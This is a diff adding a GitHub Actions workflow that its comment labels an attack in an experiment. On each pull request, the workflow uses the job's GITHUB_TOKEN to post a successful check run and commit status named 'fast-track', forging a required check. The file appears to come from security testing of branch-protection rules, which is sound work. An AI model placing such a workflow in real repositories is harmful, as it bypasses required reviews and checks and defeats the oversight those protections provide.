@@ -1,0 +1,17 @@
+# Attack in experiment A2 (#174): forge the App's required check from Actions.
+name: spoof2
+on: pull_request
+permissions:
+  checks: write
+  statuses: write
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
+      SHA: ${{ github.event.pull_request.head.sha }}
+    steps:
+      - name: Check run named fast-track from the GITHUB_TOKEN
+        run: gh api repos/${{ github.repository }}/check-runs -f name=fast-track -f head_sha=$SHA -f status=completed -f conclusion=success -f "output[title]=forged" -f "output[summary]=forged by the PR's workflow"
+      - name: Commit status named fast-track from the GITHUB_TOKEN
+        run: gh api repos/${{ github.repository }}/statuses/$SHA -f state=success -f context=fast-track -f description=forged
